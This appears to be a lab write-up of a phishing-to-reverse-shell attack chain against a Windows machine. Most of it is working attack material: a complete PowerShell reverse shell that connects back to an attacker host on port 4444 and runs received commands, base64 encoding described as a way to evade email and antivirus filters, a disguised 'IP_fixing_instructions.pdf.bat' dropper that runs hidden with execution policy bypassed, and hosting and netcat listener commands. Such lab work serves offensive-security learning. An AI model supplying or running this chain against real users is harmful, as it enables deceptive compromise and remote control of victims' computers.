# Payload Delivery -- Phishing & Reverse Shell

## Objective
Deliver a malicious payload to the Windows victim via a
phishing link, establish a reverse shell, and gain
interactive command access from Kali.

## Attack Chain Overview
1. Craft malicious PowerShell reverse shell script, utilize TCP connection so every packet arrives in order (very important)
2. Encode payload in base64 to bypass email/AV filters
3. Wrap in .bat file with double extension obfuscation
4. Host file on Python HTTP server (Mock website to download malicious payload)
5. Deliver link via phishing email
6. Catch reverse shell on Netcat listener

## Step 1 -- The PowerShell Payload
```powershell
# Attacker's Kali Linux IP -> this is where the shell calls back to
$ip = "10.10.10.126"

# Port on Kali that Netcat is listening on (nc -lvnp 4444)
$port = 4444

# Create a TCP connection from the victim Windows machine to Kali
# This is the "reverse" part, victim reaches OUT to attacker, 
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)

# Open the data stream over that TCP connection
# All commands and output travel through this stream
$stream = $client.GetStream()

# Create a reader to receive commands sent FROM Kali
$reader = New-Object System.IO.StreamReader($stream)

# Create a writer to send command output BACK to Kali
$writer = New-Object System.IO.StreamWriter($stream)

# Automatically flush the buffer after every write
# Without this, output can get stuck and never arrive
$writer.AutoFlush = $true

# Keep the shell alive as long as the TCP connection is open
while($client.Connected) {

    # Send a prompt to Kali so the attacker knows its ready for input
    $writer.Write("Shell> ")

    # Wait and read whatever command the attacker types on Kali
    $cmd = $reader.ReadLine()

    # Execute the command on the victim machine
    # iex = Invoke-Expression (runs the string as a real command)
    # 2>&1 captures both standard output and error messages
    # Out-String converts the output to a readable string
    $out = (iex $cmd 2>&1 | Out-String)

    # Send the command output back to Kali for the attacker to see
    $writer.WriteLine($out)
}
```
When executed, connects back to Kali on port 4444 and
hands over an interactive command prompt.

## Step 2 -- Base64 Encoding
Gmail and AV tools block keywords like TCPClient and
New-Object. Encoding converts those keywords to
unrecognizable gibberish that bypasses filters.
```bash
iconv -f UTF-8 -t UTF-16LE payload.ps1 | base64 -w 0 > encoded_payload.txt
```

PowerShell's -EncodedCommand flag requires UTF-16LE
encoding. Linux defaults to UTF-8 so iconv converts
it first.

## Step 3 -- BAT File Wrapper
```bash
echo "@echo off" > IP_fixing_instructions.pdf.bat
echo "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $(cat encoded_payload.txt)" >> IP_fixing_instructions.pdf.bat
echo "exit" >> IP_fixing_instructions.pdf.bat
```
Windows hides known file extensions by default. Victim
sees "IP_fixing_instructions.pdf" and double clicks
thinking it is a document. They are running a script.

## Step 4 -- Host the File
```bash
python3 -m http.server 8080
```
Hosts the malicious file on Kali at port 8080.
Victim downloads by clicking the phishing link.

## Step 5 -- Catch the Shell
```bash
nc -lvnp 4444
```

| Flag | Meaning |
|------|---------|
| -l | Listen mode |
| -v | Verbose output |
| -n | No DNS lookups |
| -p | Specify port |

## Result
Successfully established reverse shell. Windows victim
connected back to Kali on port 4444, handing over an
interactive command prompt.

## MITRE ATT&CK Mapping
| Technique | ID |
|-----------|-----|
| Phishing | T1566 |
| Obfuscated Files | T1027 |
| PowerShell Execution | T1059.001 |
| Ingress Tool Transfer | T1105 |
| Reverse Shell / C2 | T1071 |
| User Execution | T1204 |
